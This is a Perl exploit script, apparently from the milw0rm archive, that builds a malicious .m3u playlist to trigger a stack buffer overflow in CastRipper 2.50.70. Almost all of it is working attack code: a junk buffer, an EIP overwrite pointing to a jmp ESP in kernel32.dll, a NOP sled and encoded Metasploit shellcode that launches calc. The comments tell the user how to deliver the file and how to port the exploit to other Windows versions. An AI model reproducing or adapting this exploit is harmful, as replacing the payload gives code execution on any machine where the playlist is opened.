#!/usr/bin/perl
#[+]--------------------------------------------------------------------------------------[+]#
# CastRipper 2.50.70 (.m3u) Local buffer Overflow Exploit
# By [0]x80->[H]4xÂ²0r
# hashteck[at]Gmail[dot]com
# From Morocco
#[+]--------------------------------------------------------------------------------------[+]#
# program : CastRipper
# version : 2.50.70
# download : http://www.mini-stream.net/castripper/
#[+]--------------------------------------------------------------------------------------[+]#
# Tested Under Win$hit Vista Pro
# After launching the sploit just drag&drop the .m3u file in the Ripper , Enjoy ;)#
# NOTE : if you want to use it under an other version of Win32 use jmpfind.exe 
#( avalaible on the net) to find a matching address with which you'll overwrite your EIP .
#[+]--------------------------------------------------------------------------------------[+]#
##################################### Proud to be Moroccan ###################################


$junk="\x41" x 17379;
$eip="\xF8\x03\xB1\x76"; # 0x76B103F8 jmp ESP - Kernel32.dll
$nops="\x46" x 10;
# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
$shell =
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x88".
"\xd3\x37\xcc\x83\xeb\xfc\xe2\xf4\x74\x3b\x73\xcc\x88\xd3\xbc\x89".
"\xb4\x58\x4b\xc9\xf0\xd2\xd8\x47\xc7\xcb\xbc\x93\xa8\xd2\xdc\x85".
"\x03\xe7\xbc\xcd\x66\xe2\xf7\x55\x24\x57\xf7\xb8\x8f\x12\xfd\xc1".
"\x89\x11\xdc\x38\xb3\x87\x13\xc8\xfd\x36\xbc\x93\xac\xd2\xdc\xaa".
"\x03\xdf\x7c\x47\xd7\xcf\x36\x27\x03\xcf\xbc\xcd\x63\x5a\x6b\xe8".
"\x8c\x10\x06\x0c\xec\x58\x77\xfc\x0d\x13\x4f\xc0\x03\x93\x3b\x47".
"\xf8\xcf\x9a\x47\xe0\xdb\xdc\xc5\x03\x53\x87\xcc\x88\xd3\xbc\xa4".
"\xb4\x8c\x06\x3a\xe8\x85\xbe\x34\x0b\x13\x4c\x9c\xe0\x23\xbd\xc8".
"\xd7\xbb\xaf\x32\x02\xdd\x60\x33\x6f\xb0\x56\xa0\xeb\xd3\x37\xcc";

# | --------------Junk-------------|-EIP-|----Nops----|-----------Shellcode----------|
open(m3u,">>Exploit.m3u");
print m3u $junk.$eip.$nops.$shell;
print "[+] Done !! [+]";
close(m3u);

# milw0rm.com [2009-05-12]
